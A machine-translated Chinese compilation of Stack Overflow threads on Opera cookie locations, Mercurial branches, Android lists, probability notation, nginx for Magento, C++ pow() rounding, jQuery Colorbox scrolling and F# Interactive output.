我正在开发一个用于清理 cookie 的 VB 工具。FF 和 IE 已经指定了存储 cookie 的路径，我只是删除了这些路径中的文件。但我真的不知道 Opera 将 cookie 存储在哪里以及如何删除 Opera cookie。请给我一个建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2020-01-02T02:49:45.953

另一个答案很老了。2020 年 1 月 1 日，Opera 65.0.3467.78 使用

`%AppData%\Roaming\Opera Software\Opera Stable`

该目录中有一个 SQLite 格式的“cookies”文件。该目录中还有一个“cookies-journal”文件。

有关在 Opera 中管理 cookie 的信息，请访问：

[https://help.opera.com/en/latest/web-preferences/#cookies](https://help.opera.com/en/latest/web-preferences/#cookies)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-01T00:26:06.513

Opera 将其 cookie 存储在 中`%appdata%\Opera\Opera\cookies4.dat`，您可以删除该文件。如果您想删除单个 cookie，则需要做更多的工作。

# mercurial - 合并后如何删除 Mercurial 分支

> ID：12213250
> 
> 赞同：23
> 
> 时间：2012-08-31T10:10:20.410
> 
> 标签：mercurial

我正在为我的应用程序中的新功能创建命名的 Mercurial 分支，在完成特定功能后，我将该分支合并到**默认**分支中，并关闭此功能分支。

但我想知道是否有办法完全删除那些命名分支，而不会丢失合并到默认分支中的更改？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-08-31T12:19:05.383

不，没有。

当您合并两个分支时，合并提交取决于其两个父提交的存在。这意味着您不能删除构成合并分支的提交，除非您还删除了您不想这样做的合并提交。

这也不是做事的“善变方式”。当一个分支被合并到另一个分支，并且没有对该分支进行进一步开发时，Mercurial 会识别出该分支不再处于活动状态；`hg branches`会将那些不活动的分支放在列表的底部。您也可以使用 关闭分支`hg commit --close-branch`，这将从`hg branches`列表中删除分支（除非`-c`给出参数）。

听起来您应该研究 Mercurial 队列 (MQ)，因为它支持与您描述的类似的工作流程。例如，您可以设置多个 MQ 队列，每个队列代表一个开发分支。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-09T15:14:48.077

# 主意：

就在将我的合并功能分支推送到远程服务器之前，我想：“我不希望任何人知道我的分支，我希望它从未存在过”。因此，我决定在推送到远程之前将所有本地更改放入一个提交中。

# 方法：

1.  *将原始*存储库和*分支*存储库克隆到单独的目录中：

    ```
    hg clone ssh://site//hg/repository repository-origin
    hg clone /home/user/work/repository repository-branch 
    ```

2.  在**repository-branch**中合并*默认*和*功能*分支：

     **```
    cd repository-branch
    hg merge feature-branch
    hg commit -m "feature-branch: merging into default"
    cd .. 
    ```** 
***   创建**主**存储库：

    ```
    hg clone repository-origin repository 
    ```

    *   用**存储库分支**文件覆盖**master**中的所有文件（不包括隐藏文件）：

     **```
    rsync -av --exclude=".*" repository-branch/ repository 
    ```** ***   使用单个提交合并从*功能*分支到**主分支的所有更改：**

    ```
    cd repository
    hg commit -m "feature-branch: merging into default" 
    ```

    *   推送到远程**** 

 ****在最后一个提交消息中包含来自不需要的分支的所有/某些提交的信息可能会很好。

# 优点缺点：

*   适用于未推动的分支
*   将提交压缩在一起并丢失信息
*   无需扩展****

# android - 在 ImageButton 单击时显示值列表

> ID：12213253
> 
> 赞同：0
> 
> 时间：2012-08-31T10:10:38.297
> 
> 标签：android

我有一个菜单按钮图像和那个 ImageView 的 onclick 我必须创建一个值列表。例如：在音乐播放器应用程序中单击菜单图像删除、共享方式等。选项正在显示。如果有人为此工作，请尽快回复。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:15:00.923

如果我正确理解了您的问题，那么您需要做的就是将要在列表中显示的值放在**ArrayList**中，当单击 ImageButton 时，将此 ArrayList 设置为列表的**适配器**并通过或*重绘列表*`invalidate()`也许只是打电话`notifyDatasetChanged()`。

本[教程](http://www.mkyong.com/android/android-listview-example/)帮助您了解 ListViews，除此之外，您只需要在 onClickHandler 中调用 invalidate() 或 notifyDatasetChanged()。

希望能帮助到你。

# math - 概率符号

> ID：12213254
> 
> 赞同：6
> 
> 时间：2012-08-31T10:10:39.993
> 
> 标签：math, boolean, probability, notation, probability-theory

我想问你关于概率的符号。

我知道

> P(A | B) = 假设事件 B 已经发生，事件 A 发生的条件概率

但我找不到什么 A,B 或在我的情况下是 P(A|B,C)。我建议它的意思是“在 B 和 C 都已经发生的情况下，事件 A 发生的条件概率”

我不知道逗号是什么意思。

你能帮助我吗 ？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-31T16:04:04.440

你基本上是对的。

P(A| B) 是 A*给定*B 的概率。 P(A| B, C) 是 A*给定*（B 和 C）的概率。

您可以将其写成 P(A| B ∧ C) 一样容易，但使用逗号是符号约定。将竖线之后的所有内容视为给定事物的列表，以逗号分隔。

（请注意，竖线是一个*非常*高优先级的运算符，可以这么说。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:21:45.180

这是根据贝叶斯规则

P(C|A,B) = P(A,B|C).P(C) / P(A,B)

# .htaccess - Nginx - Magento 多个网站

> ID：12213255
> 
> 赞同：1
> 
> 时间：2012-08-31T10:10:40.310
> 
> 标签：.htaccess, magento, nginx, webserver

我有多个网站的 Magento 安装，它在 Apache Web 服务器中运行。现在我想将这些移动到 Nginx 网络服务器；如何通过 Nginx 配置实现这一点？以下是重定向网站的 htaccess 代码：

```
SetEnvIf HOST 44\.55\.222\.101\:8080 MAGE_RUN_CODE=website_new
SetEnvIf HOST 44\.55\.222\.101\:8080 MAGE_RUN_TYPE=website 
```

请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T05:04:04.950

要在具有不同端口的同一服务器上运行 2 个 Magento 网站，您必须为`/etc/nginx/conf.d/`.

从提供的示例中，您似乎在端口 80 和 8080 上运行网站。 Magento 在[http://www.magentocommerce.com/wiki/1_-_installation_and_configuration/configuring_nginx_for_magento提供了默认的 nginx 配置](http://www.magentocommerce.com/wiki/1_-_installation_and_configuration/configuring_nginx_for_magento)

将此用于端口 80，对于 8080，请使用以下代码：

```
server {
    listen 8080 default;
    server_name 44.55.222.101; 
    root /var/www/html;
    location / {
        index index.php index.html index.htm;
        try_files $uri $uri/ @handler;
        expires 30d;
    }
    location ^~ /app/ { deny all; }
    location ^~ /includes/           { deny all; }
    location ^~ /lib/                { deny all; }
    location ^~ /media/downloadable/ { deny all; }
    location ^~ /pkginfo/            { deny all; }
    location ^~ /report/config.xml   { deny all; }
    location ^~ /var/                { deny all; }
    location /var/export/ {
        auth_basic           "Restricted";
        auth_basic_user_file htpasswd;
        autoindex            on;
    }
    location  /. {
        return 404;
    }
    location @handler {
        rewrite / /index.php;
    }
    location ~ .php/ {
        rewrite ^(.*.php)/ $1 last;
    }
    location ~ .php$ {
        if (!-e $request_filename) { rewrite / /index.php last; } 
        expires        off;
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_param  HTTPS $fastcgi_https;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        fastcgi_param  MAGE_RUN_CODE website_new; 
        fastcgi_param  MAGE_RUN_TYPE website;
        include        fastcgi_params; 
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-07T22:56:56.380

商店代码在 Administration > Configuration > Manage Stores 中定义

```
fastcgi_param  MAGE_RUN_CODE default;
fastcgi_param  MAGE_RUN_TYPE store; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T18:43:44.520

`.htaccess`并且`SetEnvIf`适用于 Apache Web 服务器。对于 Nginx，您可以使用`fastcgi_param`（如果您使用 fastcgi 运行 nginx）。

您可以在此处找到更多详细信息：http: [//www.magentocommerce.com/wiki/1_-_installation_and_configuration/configuring_nginx_for_magento](http://www.magentocommerce.com/wiki/1_-_installation_and_configuration/configuring_nginx_for_magento)

# c++ - C++ 中不可预测的输出

> ID：12213260
> 
> 赞同：3
> 
> 时间：2012-08-31T10:10:47.413
> 
> 标签：c++

这是源代码示例

```
#include <iostream.h>
#include <conio.h>
#include <math.h>
 int main()
{
    int i=2,a;
    a= pow(10,i);
    int b=0;
    b+=a;
    cout<<b;
    getch();
} 
```

我期望的输出`100`很清楚。但是编译器`99`作为输出给出。谁能解释一下代码中的问题以及如何纠正它以获得`100`输出。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:14:17.557

`pow(10,i)`是 99.99999999999 然后下限为整数 a=99

您也可以创建自己的整数重载`pow(int,int)`。

再会。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T10:19:38.450

更改此行：

```
a = round(pow(10,i)); 
```

您可以将`round`函数编写为：

```
int round(double r) {
    return (r > 0.0) ? floor(r + 0.5) : ceil(r - 0.5);
} 
```

**注意：** `pow()`返回双精度，因此避免此类问题的最佳方法是使用`a`双精度，而不是`int`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:18:38.063

更改您的 FPU 舍入模式。从四舍五入到零转换为四舍五入到最接近。C 标准中没有定义如何执行此操作，因此您需要使用一些内在指令或一些内联汇编程序。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T10:21:07.580

您需要使用`ceil()`将值舍`double`入为整数，只需分配与`floor()`- 它在您的情况下截断浮点数的小数部分`double`（正数）。您可能还会发现进行数学舍入很有用 -`floor(x + 0.5)`对于正数`x`，`ceil(x - 0.5)`对于负数。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T10:56:49.487

[pow](http://www.codecogs.com/reference/computing/c/math.h/pow.php)的文档如下：

```
#include <math.h>
  double  pow (double x, double y)
  long    powl (long double x, long double y)
  float   powf (float x, float y) 
```

`pow(10, 2)`a也是如此`double`，并且可能被计算为`99.99999999999`

所以你的线

`a = pow(10, i)`正在存储`99.99999999999`到 中`int`，因此发生**截断**并`a`变为`99`！

尝试验证我`cout`的意思。`a = pow(10, i);`

您也许可以通过声明`a`为`long`. 值得尝试...

最好将返回值存储`pow`为 a `double`or `float`，而不是 a `int`！

# jquery - Colorbox 停止背景滚动并返回父页面上的相同位置

> ID：12213267
> 
> 赞同：13
> 
> 时间：2012-08-31T10:11:15.737
> 
> 标签：jquery, drupal-7, scroll, colorbox

我有一个使用视图在 drupal 7 中创建的无序列表。每个列表项都有一个打开颜色框的链接。如果将鼠标放在颜色框（即父页面）的褪色背景上，则可以滚动父页面。我所追求的是父页面在关闭时停止滚动并返回父页面上的相同位置/锚点。

在这里搜索问题，我找到了代码：

```
$(document).bind('cbox_open', function () {
    $('html').css({ overflow: 'hidden' });
}).bind('cbox_closed', function () {
    $('html').css({ overflow: 'auto' });
}); 
```

上面的代码可以工作，但会将父页面滚动回最顶部。

如果我可以动态地做到这一点，这将起作用；

```
$("html,body").scrollTop(400); // 300 is just a example 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-31T19:35:11.993

坎尼克斯明白了。我只是隐藏身体上的溢出，html的溢出可能没问题。

```
$(document).bind('cbox_open', function() {
    $('body').css({ overflow: 'hidden' });
}).bind('cbox_closed', function() {
    $('body').css({ overflow: '' });
});​ 
```

但是，它不应该滚动回顶部。设置滚动顶部只是掩盖了另一个问题（例如不取消单击的锚元素上的默认操作）。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-08-31T14:30:27.323

我认为你可以这样做：

```
var position;
$(document).bind('cbox_open', function() {
    position = $("html,body").scrollTop();
    $('html').css({
        overflow: 'hidden'
    });
}).bind('cbox_closed', function() {
    $('html').css({
        overflow: 'auto'
    });
    $("html,body").scrollTop(position);
});​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-11T12:43:18.503

对于 iphone/ipad，我有这个很好用的解决方案！

```
$(document).bind('cbox_open', function() {
    var position = $('body').scrollTop();
        $('body').attr("data-position", position);
        $('body').css({position : 'fixed', top: '-' + position + 'px'});
    }).bind('cbox_closed', function() {
        $('body').css({position : 'relative', top: '0'}); 
        var position = $('body').attr("data-position");
        $('body').scrollTop(position);
    }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-09-15T16:58:35.493

我有两个优化建议：

1.  最好的方法是添加一个删除 css 类。如果你这样做，你可以肯定，在你离开后，一切都会“重置”。
2.  如果您使用 cbox_cleanup 而不是 cbox_closed，用户几乎不会注意到内容的“跳跃”。

因此我的解决方案是：

```
$(document).bind('cbox_open', function() {
  $('html').addClass("noScrollSimple");
}).bind('cbox_cleanup', function() {
  $('html').removeClass("noScrollSimple");
});
```

```
.noScrollSimple {
  overflow:hidden;
}
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
```

# f# - 禁止在 F# 交互中显示变量的内容

> ID：12213269
> 
> 赞同：5
> 
> 时间：2012-08-31T10:11:18.827
> 
> 标签：f#, f#-interactive, suppressmessage

> **可能重复：**
> [F# - 保持 F# 交互而不发布输出](https://stackoverflow.com/questions/2971685/f-keep-f-interactive-from-posting-output)

有什么方法可以抑制在 F# 交互中显示变量的内容？

我为什么要它？这是仅在 F# 交互中为一次调用打印的内容。找到任何有趣的信息，例如 printfn 真的很痛苦，而且打印的大量数据对我来说毫无用处......

```
Microsoft (R) F# Interactive version 11.0.50727.1
Copyright (c) Microsoft Corporation. All Rights Reserved.

For help type #help;;

> 

--> Referenced 'C:\Olda\Project_Root\Computations\Oldrich\2012-Articles\07-FiberFit-2012\Solution\PostProcess\.\bin\Release\LBM.dll'

--> Referenced 'C:\Olda\Project_Root\Computations\Oldrich\2012-Articles\07-FiberFit-2012\Solution\PostProcess\.\bin\Release\Utilities.dll'

find me

val dir : string = "2012-08-30-LOCylinder-NoFit-A"
val root : string =
  "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[65 chars]
val dirA : string [] =
  [|"y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[119 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[120 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[120 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[119 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[120 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[114 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[119 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[119 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[114 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[115 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[115 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[115 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[113 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[115 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[115 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[114 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[114 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[119 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[114 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[119 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[120 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[114 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[115 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[119 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[115 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[115 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[115 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[114 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[119 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[118 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[113 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[117 chars];
    "y:\Olda\Project\Computations\Oldrich\2012-Articles\07-FiberFi"+[116 chars];
    ...|]
val forceA : (float * float * float * float * float * float * float) [] =
  [|(0.000252805, 162180.0, 0.00554689, 0.00967337, 6.085089e-05, 4.16478e-10,
     4.166553e-10);
    (0.000487441, 47185.2, 0.020491, 0.0209057, 0.0005467281, 3.79865e-09,
     3.800069e-09);
    (0.000520718, 55692.3, 0.00697143, 0.00753794, 6.595801e-05, 1.432917e-09,
     1.432363e-09);
    (0.000550027, 96358.8, 0.00854397, 0.00240232, 2.442474e-05, 4.999992e-10,
     5.00477e-10);
    (0.000637991, 51724.8, 0.00528963, 0.0046053, 3.080306e-05, 1.337413e-09,
     1.33686e-09);
    (0.00066014, 43930.1, 0.0089495, 0.0114244, 0.0001314435, 3.54952e-09,
     3.548926e-09);
    (0.000663432, 40697.4, 0.020461, 0.0196952, 0.0005221612, 6.556135e-09,
     6.556114e-09);
    (0.000717394, 27878.7, 0.0139497, 0.000584649, 1.09966e-05, 2.270765e-10,
     2.270286e-10);
    (0.000724047, 71818.5, 0.0468557, 0.0094224, 0.0005404112, 3.747363e-09,
     3.748081e-09);
    (0.000749414, 42700.0, 0.0170848, 0.01729, 0.0003808691, 7.173521e-09,
     7.174374e-09);
    (0.000813187, 30743.3, 0.0623997, 0.06458, 0.005377043, 3.260309e-08,
     3.260849e-08);
    (0.000833705, 53975.9, 0.0611242, 0.0626591, 0.004822256, 3.280713e-08,
     3.280833e-08);
    (0.000885524, 40653.9, 0.0211935, 0.0211017, 0.0005795428, 1.203752e-08,
     1.203399e-08);
    (0.000886704, 24811.0, 0.0575155, 0.0426739, 0.00335128, 2.626019e-08,
     2.621327e-08);
    (0.000892993, 39194.0, 0.0537971, 0.0465439, 0.003257076, 2.806999e-08,
     2.807582e-08);
    (0.000919246, 40250.4, 0.0117258, 0.00157283, 2.392413e-05, 9.683138e-10,
     9.683923e-10);
    (0.0009245, 28123.3, 0.0777698, 0.00908261, 0.0009515064, 5.969178e-09,
     5.970366e-09);
    (0.000930961, 21483.2, 0.0339286, 0.0246477, 0.001159995, 1.643661e-08,
     1.643989e-08);
    (0.000933435, 56779.6, 0.0810023, 0.0373661, 0.003791664, 2.443185e-08,
     2.443248e-08);
    (0.00093525, 40630.8, 0.0399094, 0.0178482, 0.0009231236, 1.190616e-08,
     1.190947e-08);
    (0.000943539, 23316.5, 0.067747, 0.0591666, 0.005510258, 4.073487e-08,
     4.074218e-08);
    (0.000952661, 32540.4, 0.0588305, 0.0322833, 0.002519025, 2.246114e-08,
     2.246379e-08);
    (0.000955299, 45012.1, 0.0706107, 0.0434361, 0.003933234, 3.033197e-08,
     3.033881e-08);
    (0.000957235, 25072.2, 0.0712521, 0.0462312, 0.004492653, 3.275724e-08,
     3.276463e-08);
    (0.000996275, 51190.7, 0.0162435, 0.00258837, 5.32194e-05, 1.834346e-09,
     1.833968e-09);
    (0.00100803, 48609.6, 0.0351237, 0.0111806, 0.0004996876, 8.370027e-09,
     8.367669e-09);
    (0.00102104, 49948.9, 0.085035, 0.03227, 0.00348206, 2.470744e-08,
     2.471084e-08);
    (0.00103962, 36551.9, 0.048354, 0.0223518, 0.001416119, 1.854891e-08,
     1.854854e-08);
    (0.0010463, 24849.4, 0.105262, 0.0834671, 0.01199443, 7.070312e-08,
     7.069647e-08);
    (0.00105721, 33105.9, 0.0402657, 0.02732, 0.001456394, 2.33656e-08,
     2.335479e-08);
    (0.00107435, 37231.9, 0.0963023, 0.0845338, 0.01064605, 7.474111e-08,
     7.472305e-08);
    (0.00107624, 25087.2, 0.0952104, 0.0608672, 0.007903313, 5.438275e-08,
     5.437514e-08);
    (0.00109594, 47447.9, 0.0407242, 0.0326682, 0.001696979, 2.977274e-08,
     2.977017e-08);
    (0.00110379, 53452.1, 0.0593868, 0.0276272, 0.00206778, 2.536138e-08,
     2.534933e-08);
    (0.00115744, 43198.7, 0.024398, 0.00429235, 0.0001348665, 4.195718e-09,
     4.195235e-09);
    (0.00117978, 16952.3, 0.12626, 0.0301736, 0.005426417, 3.282684e-08,
     3.278765e-08);
    (0.00120028, 34158.6, 0.0325227, 0.00597382, 0.000256372, 6.536934e-09,
     6.53295e-09);
    (0.00122926, 17896.9, 0.124676, 0.0847117, 0.01495147, 9.904861e-08,
     9.905314e-08);
    (0.00123643, 36395.1, 0.111293, 0.0408434, 0.005958529, 4.817523e-08,
     4.816387e-08);
    (0.00124992, 43202.6, 0.0590766, 0.0121188, 0.0009219895, 1.423823e-08,
     1.423623e-08);
    (0.001272, 28302.0, 0.0949724, 0.0396994, 0.00507548, 4.948594e-08,
     4.94959e-08);
    (0.0012874, 25633.1, 0.137221, 0.0407709, 0.007611981, 5.206046e-08,
     5.206579e-08);
    (0.00131784, 25041.0, 0.0272075, 0.0174181, 0.0006464227, 2.316323e-08,
     2.31496e-08);
    (0.00135293, 24391.6, 0.175938, 0.0698772, 0.01681764, 1.002225e-07,
     1.000757e-07);
    (0.00138081, 24623.2, 0.0219953, 0.00237801, 7.147705e-05, 3.421686e-09,
     3.42296e-09);
    (0.00138722, 18742.6, 0.147133, 0.0717624, 0.01487001, 1.06958e-07,
     1.069541e-07);
    (0.00139011, 28055.4, 0.175219, 0.0799703, 0.01888046, 1.198027e-07,
     1.198163e-07);
    (0.00141441, 40299.4, 0.140834, 0.0120105, 0.002193942, 1.851482e-08,
     1.852465e-08);
    (0.00144188, 27048.0, 0.096203, 0.0158642, 0.002064509, 2.546946e-08,
     2.547052e-08);
    (0.00145794, 20576.9, 0.0298659, 0.0142573, 0.0005934664, 2.238276e-08,
     2.238653e-08);
    (0.0014588, 26048.8, 0.0189348, 0.00905385, 0.0002328446, 1.403915e-08,
     1.403417e-08);
    (0.00148458, 35026.7, 0.0502257, 0.00209144, 0.0001382484, 3.497224e-09,
     3.495815e-09);
    (0.00150793, 18568.6, 0.0791763, 0.0471974, 0.005268336, 8.268661e-08,
     8.270279e-08);
    (0.00151242, 25125.2, 0.124505, 0.0408327, 0.006932091, 6.975898e-08,
     6.97626e-08);
    (0.00152236, 24961.2, 0.122531, 0.0467549, 0.007817189, 8.385714e-08,
     8.385767e-08);
    (0.001547, 35552.7, 0.193467, 0.0608618, 0.01547265, 1.127605e-07,
     1.127148e-07);
    (0.00155408, 23808.3, 0.0155603, 0.000334059, 7.129467e-06, 5.90586e-10,
     5.908897e-10);
    (0.00158524, 30279.3, 0.016816, 0.00528343, 0.0001187417, 9.645225e-09,
     9.645381e-09);
    (0.00162094, 34547.9, 0.184929, 0.0360896, 0.008796386, 7.280724e-08,
     7.282266e-08);
    (0.00162749, 25806.6, 0.0699643, 0.036791, 0.003499689, 7.512538e-08,
     7.513471e-08);
    (0.00163032, 14721.0, 0.165242, 0.0809329, 0.01935831, 1.664562e-07,
     1.664348e-07);
    (0.00164021, 13412.9, 0.00929598, 0.00208771, 2.839679e-05, 4.228591e-09,
     4.226611e-09);
    (0.00167718, 28619.5, 0.162502, 0.0477672, 0.01043674, 1.036319e-07,
     1.036323e-07);
    (0.00168363, 14848.9, 0.00564324, 0.000503082, 4.10542e-06, 1.038905e-09,
     1.039067e-09);
